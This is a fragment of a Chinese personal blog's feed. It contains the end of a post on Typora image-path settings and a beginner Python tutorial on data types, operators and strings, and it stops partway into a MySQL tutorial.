title="2、Typora设置图片的相对路径"></a>2、Typora设置图片的相对路径</h5><p>勾选下面两项“对本地位置的图片应用上述规则”和“优先使用相对路径”。</p><p><img src="/2020/10/27/problem/2.jpg" alt="2"></p><p>更改设置后每次在新建一个md文件时，在md文档所在文件夹中就会自动创建一个与该文件同名的.assets的文件夹，复制的图片也会自动保存到其中。</p><p><img src="/2020/10/27/problem/3.jpg" alt="3"></p><h5 id="3、Typora自动复制图片到指定目录下"><a href="#3、Typora自动复制图片到指定目录下" class="headerlink" title="3、Typora自动复制图片到指定目录下"></a>3、Typora自动复制图片到指定目录下</h5><p><img src="/2020/10/27/problem/4.jpg" alt="4"></p><p>之后的图片路径会变成类似如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![黑客](Cyber.assets&#x2F;黑客.jpg)</span><br></pre></td></tr></table></figure><h3 id="法二：-适用于mac"><a href="#法二：-适用于mac" class="headerlink" title="法二：(适用于mac)"></a>法二：(适用于mac)</h3><ol><li>与法一类似，在改设置的步骤一时多勾上第四条：允许根据YML设置自动上床图片。</li><li>需再安装图床应用 iPic。</li><li>在改设置的第三步骤时勾选如下:</li></ol><p><img src="/2020/10/27/problem/5.jpg" alt="5"></p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>markdown可以使用<code>[TOC]</code>来自动生成markdown文件的标题目录，但是github却不支持<code>[TOC]</code>标签。以下针对vscode，安装了Markdown All in One插件。下载地址：<a href="https://www.vsixhub.com/vsix/1925/%E3%80%82%E7%84%B6%E5%90%8E%E5%AF%B9%E4%BA%8E%E4%BD%A0%E8%A6%81%E7%94%9F%E6%88%90%E7%9B%AE%E5%BD%95%E7%9A%84md%E6%96%87%E4%BB%B6%EF%BC%8Cvscode%E5%BF%AB%E6%8D%B7%E9%94%AE">https://www.vsixhub.com/vsix/1925/。然后对于你要生成目录的md文件，vscode快捷键</a> ctrl + shift + p 打开如下</p><p><img src="/2020/10/27/problem/6.jpg" alt="6"></p><p>选择<code> create table of contents</code> 回车即可生成目录。</p><h2 id="尾记"><a href="#尾记" class="headerlink" title="尾记"></a>尾记</h2><p>最开始图片显示不了的时候特别难受，尤其第一篇文章Markdown中图片很多；当时上百度知乎之类的没有找到解决方案（有的就只有一半，有的根本不行 ),后来搁置了，靶场的环境建完后，又绕回来纠结这个问题，终于找到正解了，平平无奇小天才<del>~</del></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python</title>
    <link href="/2020/10/24/python/"/>
    <url>/2020/10/24/python/</url>
    
    <content type="html"><![CDATA[<h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>在一些教程中，在Python文件的行首会写上<code>#!/usr/bin/python3</code>它的作用是用来指定Python的解释器，并用只能应用于Linux、Mac等系统中，Windows系统会忽略这个注释。效果等同于<code>#!/usr/bin/env python3</code>其作用就是让env去查找python3的绝对路径替换作为解释器路径。</p><p> <a href="#python">Python</a></p><ul><li><a href="#python%E8%A7%A3%E9%87%8A%E5%99%A8">Python解释器</a><ul><li><a href="#%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%BC%96%E7%A8%8B">交互式编程</a></li><li><a href="#%E8%84%9A%E6%9C%AC%E5%BC%8F%E7%BC%96%E7%A8%8B">脚本式编程</a></li></ul></li><li><a href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">基本数据类型</a><ul><li><a href="#%E5%A4%9A%E4%B8%AA%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC">多个变量赋值</a></li></ul></li><li><a href="#%E6%A0%87%E5%87%86%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">标准数据类型</a><ul><li><a href="#number">Number</a></li><li><a href="#string">String</a></li><li><a href="#list">List</a></li><li><a href="#tuple">Tuple</a></li><li><a href="#set">Set</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E5%85%83%E7%B4%A0">添加元素</a></li><li><a href="#%E7%A7%BB%E9%99%A4%E5%85%83%E7%B4%A0">移除元素</a></li><li><a href="#%E6%B8%85%E7%A9%BA%E9%9B%86%E5%90%88">清空集合</a></li><li><a href="#%E6%97%A0%E9%99%90%E6%9E%81%E5%B5%8C%E5%A5%97">无限极嵌套</a></li></ul></li><li><a href="#python-%E8%BF%90%E7%AE%97%E7%AC%A6">Python 运算符</a><ul><li><a href="#%E6%88%90%E5%91%98%E8%BF%90%E7%AE%97%E7%AC%A6">成员运算符</a></li><li><a href="#%E8%BA%AB%E4%BB%BD%E8%BF%90%E7%AE%97%E7%AC%A6">身份运算符</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">运算符优先级</a></li></ul></li><li><a href="#%E6%95%B0%E5%AD%97">数字</a><ul><li><a href="#%E6%95%B0%E5%AD%97%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">数字类型转换</a></li><li><a href="#round%E6%B5%AE%E7%82%B9%E6%95%B0%E5%AD%98%E5%82%A8%E6%9C%89%E7%82%B9%E5%A5%87%E6%80%AA">round（浮点数存储有点奇怪）</a></li><li><a href="#-%E5%92%8C--%E7%9A%84%E4%B8%8D%E5%90%8C"><strong>+=</strong> 和 <strong>=+</strong> 的不同</a></li></ul></li><li><a href="#python-%E5%AD%97%E7%AC%A6%E4%B8%B2">Python 字符串</a><ul><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9B%B4%E6%96%B0">字符串更新</a></li><li><a href="#%E4%B8%89%E5%BC%95%E5%8F%B7">三引号</a></li></ul></li></ul><h2 id="Python解释器"><a href="#Python解释器" class="headerlink" title="Python解释器"></a>Python解释器</h2><h4 id="交互式编程"><a href="#交互式编程" class="headerlink" title="交互式编程"></a>交互式编程</h4><p>需要打开 cmd 窗口（命令提示符窗口），在窗口中键入<code>python</code>,回车，进入了交互式编程，此时我们直接输入 python 语句，就可以得到运行的结果。</p><h4 id="脚本式编程"><a href="#脚本式编程" class="headerlink" title="脚本式编程"></a>脚本式编程</h4><p>先把 python 语句写好，保存在后缀为 .py 的文件里，然后从外部调用这个文件。它也可以使用 cmd 窗口进行调用，<strong>与交互式编程不同的是，不能在cmd窗口内输入python加回车来进入交互模式</strong>。</p><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><h4 id="多个变量赋值"><a href="#多个变量赋值" class="headerlink" title="多个变量赋值"></a>多个变量赋值</h4><p>python可实现多个变量赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; b &#x3D; c &#x3D; 1</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a, b, c &#x3D; 1, 2, &quot;blackpink&quot;</span><br></pre></td></tr></table></figure><h2 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h2><ul><li><strong>不可变数据（3 个）：</strong>Number（数字）、String（字符串）、Tuple（元组）；</li><li><strong>可变数据（3 个）：</strong>List（列表）、Dictionary（字典）、Set（集合）。</li></ul><h4 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h4><p>有int、float、bool、complex</p><p>type() 函数可以用来查询变量所指的对象类型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a, b, c, d &#x3D; 20, 9.5, True, 5+6j</span><br><span class="line">&gt;&gt;&gt; print(type(a), type(b), type(c), type(d))</span><br><span class="line">&lt;class &#39;int&#39;&gt; &lt;class &#39;float&#39;&gt; &lt;class &#39;bool&#39;&gt; &lt;class &#39;complex&#39;&gt;</span><br></pre></td></tr></table></figure><p>也可用 isinstance 来判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; 5+6j</span><br><span class="line">&gt;&gt;&gt; isinstance(a, int)</span><br><span class="line">Flase</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>数值的除法包含两个运算符：**/** 返回一个浮点数，**//** 返回一个整数。在混合计算时，Python会把整型转换成为浮点数。</p><h4 id="String"><a href="#String" class="headerlink" title="String"></a>String</h4><p>字符串用单引号 <strong>‘</strong> 或双引号 <strong>“</strong> 括起来，同时使用反斜杠 \转义特殊字符。</p><p>字符串截取的语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变量[头下标:尾下标]</span><br></pre></td></tr></table></figure><p>索引值以 0 为开始值，-1 为从末尾的开始位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str &#x3D; &#39;blackpink&#39;</span><br><span class="line"></span><br><span class="line">print (str)          # 输出字符串</span><br><span class="line">print (str[0:-1])    # 输出第一个到倒数第二个的所有字符</span><br><span class="line">print (str[0])       # 输出字符串第一个字符</span><br><span class="line">print (str[2:5])     # 输出从第三个开始到第五个的字符</span><br><span class="line">print (str[2:])      # 输出从第三个开始的后的所有字符</span><br><span class="line">print (str * 2)      # 输出字符串两次，也可以写成 print (2 * str)</span><br><span class="line">print (str + &quot;TEST&quot;) # 连接字符串</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">blackpink</span><br><span class="line">blackpin</span><br><span class="line">b</span><br><span class="line">ack</span><br><span class="line">ackpink</span><br><span class="line">blackpinkblackpink</span><br><span class="line">blackpinkTEST</span><br></pre></td></tr></table></figure><p>Python 使用反斜杠<code> \</code> 转义特殊字符，如不让反斜杠发生转义，可在字符串前面添加一个 <code>r</code>，表示原始字符串,反斜杠<code>\</code>可以作为续行符，表示下一行是上一行的延续;也可以使用 <strong>“””…”””</strong> 或者 <strong>‘’’…’’’</strong> 跨越多行。</p><h4 id="List"><a href="#List" class="headerlink" title="List"></a>List</h4><p>列表是写在方括号 <strong>[]</strong> 之间用逗号分隔开的元素列表。列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表，语法与string相同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">list &#x3D; [ &#39;abcd&#39;, 365 , 2.83, &#39;blackpink&#39;, 89.2 ]</span><br><span class="line">tinylist &#x3D; [123, &#39;blackpink&#39;]</span><br><span class="line"></span><br><span class="line">print (list)            # 输出完整列表</span><br><span class="line">print (list[0])         # 输出列表第一个元素</span><br><span class="line">print (list[1:3])       # 从第二个开始输出到第三个元素</span><br><span class="line">print (list[2:])        # 输出从第三个元素开始的所有元素</span><br><span class="line">print (tinylist * 2)    # 输出两次列表</span><br><span class="line">print (list + tinylist) # 连接列表</span><br></pre></td></tr></table></figure><p>输出如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[&#39;abcd&#39;, 365, 2.83, &#39;blackpink&#39;, 89.2]</span><br><span class="line">abcd</span><br><span class="line">[365, 2.83]</span><br><span class="line">[2.83, &#39;blackpink&#39;, 89.2]</span><br><span class="line">[123, &#39;blackpink&#39;, 123, &#39;blackpink&#39;]</span><br><span class="line">[&#39;abcd&#39;, 365, 2.83, &#39;blackpink&#39;, 89.2, 123, &#39;blackpink&#39;]</span><br></pre></td></tr></table></figure><p>列表中的元素可以删除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del list[]</span><br></pre></td></tr></table></figure><p>可以变化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list[] &#x3D; 改变的值</span><br></pre></td></tr></table></figure><p>Python 列表截取可以接收第三个参数，参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; letters &#x3D; [&#39;c&#39;,&#39;h&#39;,&#39;e&#39;,&#39;c&#39;,&#39;k&#39;,&#39;i&#39;,&#39;o&#39;]</span><br><span class="line">&gt;&gt;&gt; letters[1:4:2]</span><br><span class="line">[&#39;h&#39;,&#39;c&#39;]</span><br></pre></td></tr></table></figure><p>如果第三个参数为负数表示逆向读取</p><p>  inputWords[-1::-1] 有三个参数， 第一个参数 -1 表示最后一个元素， 第二个参数为空，表示移动到列表末尾，第三个参数为步长，-1 表示逆向。</p><h4 id="Tuple"><a href="#Tuple" class="headerlink" title="Tuple"></a>Tuple</h4><p>tuple的元素不能修改,但可以对元组进行连接组合，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tup3 &#x3D; tup1 + tup2</span><br></pre></td></tr></table></figure><p>元组应写在小括号 <strong>()</strong> 里，元素之间用逗号隔开,元组中的元素类型也可以不相同。</p><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del tup</span><br></pre></td></tr></table></figure><p>特殊情况:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tup1 &#x3D; ()    # 空元组</span><br><span class="line">tup2 &#x3D; (20,) # 一个元素，需要在元素后添加逗号</span><br></pre></td></tr></table></figure><h4 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h4><p>使用大括号 <strong>{ }</strong> 或者 <strong>set()</strong> 函数创建集合,<strong>创建一个空集合必须用 <code>set()</code>而不是 <code>&#123; &#125;</code>，因<code>&#123; &#125;</code> 是用来创建一个空字典。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b &#x3D; set(&#39;blackpink&#39;)</span><br><span class="line">a &#x3D; set(&#39;blackpink in your area&#39;)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">print(a - b)     # a 和 b 的差集</span><br><span class="line"></span><br><span class="line">print(a | b)     # a 和 b 的并集</span><br><span class="line"></span><br><span class="line">print(a &amp; b)     # a 和 b 的交集</span><br><span class="line"></span><br><span class="line">print(a ^ b)     # a 和 b 中不同时存在的元素</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;y&#39;, &#39;e&#39;, &#39;n&#39;, &#39;k&#39;, &#39;a&#39;, &#39;r&#39;, &#39;u&#39;, &#39;l&#39;, &#39;b&#39;, &#39;o&#39;, &#39; &#39;, &#39;c&#39;, &#39;p&#39;, &#39;i&#39;&#125;</span><br><span class="line">&#123;&#39;e&#39;, &#39;r&#39;, &#39;u&#39;, &#39;o&#39;, &#39; &#39;, &#39;y&#39;&#125;</span><br><span class="line">&#123;&#39;e&#39;, &#39;u&#39;, &#39;l&#39;, &#39;o&#39;, &#39;y&#39;, &#39;p&#39;, &#39;i&#39;, &#39;n&#39;, &#39;k&#39;, &#39;a&#39;, &#39;r&#39;, &#39;b&#39;, &#39; &#39;, &#39;c&#39;&#125;</span><br><span class="line">&#123;&#39;n&#39;, &#39;k&#39;, &#39;a&#39;, &#39;b&#39;, &#39;l&#39;, &#39;c&#39;, &#39;p&#39;, &#39;i&#39;&#125;</span><br><span class="line">&#123;&#39;y&#39;, &#39;e&#39;, &#39;r&#39;, &#39;u&#39;, &#39;o&#39;, &#39; &#39;&#125;</span><br></pre></td></tr></table></figure><h4 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h4><p>语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.add( x ) or s.update( x )</span><br></pre></td></tr></table></figure><h4 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h4><p>语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.remove( x ) or s.discard( x )</span><br></pre></td></tr></table></figure><h4 id="清空集合"><a href="#清空集合" class="headerlink" title="清空集合"></a>清空集合</h4><p>语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.clear()</span><br></pre></td></tr></table></figure><p>字典是一种映射类型，字典用 <strong>{ }</strong> 标识，它是一个无序的 <strong>键(key) : 值(value)</strong> 的集合。键(key)必须使用不可变类型。在同一个字典中，键(key)必须是唯一的，值则不用。</p><p>删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">del dict[&#39;Name&#39;] # 删除键 &#39;Name&#39;</span><br><span class="line">dict.clear()     # 清空字典</span><br><span class="line">del dict         # 删除字典</span><br></pre></td></tr></table></figure><p><strong>不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住</strong></p><h4 id="无限极嵌套"><a href="#无限极嵌套" class="headerlink" title="无限极嵌套"></a>无限极嵌套</h4><p>查询语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in 类别[&#39;&#39;]:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><h2 id="Python-运算符"><a href="#Python-运算符" class="headerlink" title="Python 运算符"></a>Python 运算符</h2><h4 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h4><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="center">实例</th></tr></thead><tbody><tr><td align="left">in</td><td align="left">如果在指定的序列中找到值返回 True，否则返回 False。</td><td align="center">x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td></tr><tr><td align="left">not in</td><td align="left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td><td align="center">x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td></tr></tbody></table><h4 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h4><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">is</td><td align="left">is 是判断两个标识符是不是引用自一个对象</td><td align="left"><strong>x is y</strong>, 类似 <strong>id(x) == id(y)</strong> , 如果引用的是同一个对象则返回 True，否则返回 False</td></tr><tr><td align="left">is not</td><td align="left">is not 是判断两个标识符是不是引用自不同对象</td><td align="left"><strong>x is not y</strong> ， 类似 **id(a) != id(b)**。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td></tr></tbody></table><h4 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h4><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">**</td><td align="left">指数 (最高优先级)</td></tr><tr><td align="left">~ + -</td><td align="left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td></tr><tr><td align="left">* / % //</td><td align="left">乘，除，求余数和取整除</td></tr><tr><td align="left">+ -</td><td align="left">加法减法</td></tr><tr><td align="left">&gt;&gt; &lt;&lt;</td><td align="left">右移，左移运算符</td></tr><tr><td align="left">&amp;</td><td align="left">位 ‘AND’</td></tr><tr><td align="left">^ |</td><td align="left">位运算符</td></tr><tr><td align="left">&lt;= &lt; &gt; &gt;=</td><td align="left">比较运算符</td></tr><tr><td align="left">== !=</td><td align="left">等于运算符</td></tr><tr><td align="left">= %= /= //= -= += *= **=</td><td align="left">赋值运算符</td></tr><tr><td align="left">is is not</td><td align="left">身份运算符</td></tr><tr><td align="left">in not in</td><td align="left">成员运算符</td></tr><tr><td align="left">not and or</td><td align="left">逻辑运算符</td></tr></tbody></table><h2 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h2><h4 id="数字类型转换"><a href="#数字类型转换" class="headerlink" title="数字类型转换"></a>数字类型转换</h4><ul><li><strong>int(x)</strong> 将x转换为一个整数。</li><li><strong>float(x)</strong> 将x转换到一个浮点数。</li><li><strong>complex(x)</strong> 将x转换到一个复数，实数部分为 x，虚数部分为 0。</li><li><strong>complex(x, y)</strong> 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。</li></ul><p>在整数除法中，除法 <strong>/</strong> 总是返回一个浮点数，如果只想得到整数的结果，丢弃可能的分数部分，可以使用运算符 <strong>//</strong> 。但**//** 得到的并不一定是整数类型的数，它与分母分子的数据类型有关系。</p><h4 id="round（浮点数存储有点奇怪）"><a href="#round（浮点数存储有点奇怪）" class="headerlink" title="round（浮点数存储有点奇怪）"></a>round（浮点数存储有点奇怪）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(round(10.4)) #10</span><br><span class="line">print(round(10.5)) #10</span><br><span class="line">print(round(10.6)) #11</span><br></pre></td></tr></table></figure><p>当个位为奇数，小数部分&gt;=0.5入，其余为舍;当个位为偶数，小数部分&gt;0.5入，其余为舍。</p><h4 id="和-的不同"><a href="#和-的不同" class="headerlink" title="+= 和 =+ 的不同"></a><strong>+=</strong> 和 <strong>=+</strong> 的不同</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; 5</span><br><span class="line">&gt;&gt;&gt; a +&#x3D; 6 #与a&#x3D;a+6效果相同</span><br><span class="line">&gt;&gt;&gt; a</span><br><span class="line">11</span><br></pre></td></tr></table></figure><p>对比</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b &#x3D; +6  # 其实就是正数，是一个赋值操作，+ 6 即为 +6，+6 为 6</span><br></pre></td></tr></table></figure><h2 id="Python-字符串"><a href="#Python-字符串" class="headerlink" title="Python 字符串"></a>Python 字符串</h2><h4 id="字符串更新"><a href="#字符串更新" class="headerlink" title="字符串更新"></a>字符串更新</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var1 &#x3D; &#39;Hello world!&#39;</span><br><span class="line"> </span><br><span class="line">print (&quot;已更新字符串 : &quot;, var1[:6] + &#39;blackpink!&#39;)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已更新字符串 :  Hello blackpink!</span><br></pre></td></tr></table></figure><h4 id="三引号"><a href="#三引号" class="headerlink" title="三引号"></a>三引号</h4><p>允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">para_str &#x3D; &quot;&quot;&quot;心如花木</span><br><span class="line">向阳而生</span><br><span class="line">TAB ( \t )</span><br><span class="line">也可以使用换行符 [ \n ]</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">print (para_str)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">心如花木</span><br><span class="line">向阳而生</span><br><span class="line">TAB (  )</span><br><span class="line">也可以使用换行符 [ </span><br><span class="line"> ]</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MYSQL</title>
    <link href="/2020/10/18/MYSQL/"/>
    <url>/2020/10/18/MYSQL/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><ul><li><a href="#mysql">MySQL</a><ul><li><a href="#mysql%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL创建数据库</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-mysqladmin-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">使用 mysqladmin 创建数据库</a></li><li><a href="#%E4%BD%BF%E7%94%A8-php%E8%84%9A%E6%9C%AC-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">使用 PHP脚本 创建数据库</a></li></ul></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL 删除数据库</a><ul><li><a href="#drop-%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">drop 命令删除数据库</a></li><li><a href="#%E4%BD%BF%E7%94%A8-mysqladmin-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">使用 mysqladmin 删除数据库</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">使用PHP脚本删除数据库</a></li></ul></li><li><a href="#mysql-%E9%80%89%E6%8B%A9%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL 选择数据库</a><ul><li><a href="#%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AA%97%E5%8F%A3%E4%B8%AD%E9%80%89%E6%8B%A9">从命令提示窗口中选择</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC">使用PHP脚本</a></li></ul></li><li><a href="#mysql-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8">MySQL 创建数据表</a><ul><li><a href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E5%88%9B%E5%BB%BA%E8%A1%A8">使用命令提示符创建表</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8">使用PHP脚本创建数据表</a></li></ul></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E8%A1%A8">MySQL 删除数据表</a></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE">MySQL 删除数据</a></li><li><a href="#mysql-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE">MySQL 查询数据</a><ul><li><a href="#%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6">通过命令提示符</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC-1">使用PHP脚本</a></li></ul></li><li><a href="#mysql-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE">MySQL 插入数据</a><ul><li><a href="#%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AA%97%E5%8F%A3">命令提示窗口</a></li></ul></li><li><a href="#mysql%E6%94%B9%E6%95%B0%E6%8D%AE">MySQL改数据</a><br>数据库是按照数据结构来组织、存储和管理数据的仓库。每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。</li></ul></li></ul><p>关系数据库管理系统的特点：</p><ul><li>1.数据以表格的形式出现</li><li>2.每行为各种记录名称</li><li>3.每列为记录名称所对应的数据域</li><li>4.许多的行和列组成一张表单</li><li>5.若干的表单组成database</li></ul><h2 id="MySQL创建数据库"><a href="#MySQL创建数据库" class="headerlink" title="MySQL创建数据库"></a>MySQL创建数据库</h2><p>简单命令如下：数据名为BLACKPINK</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 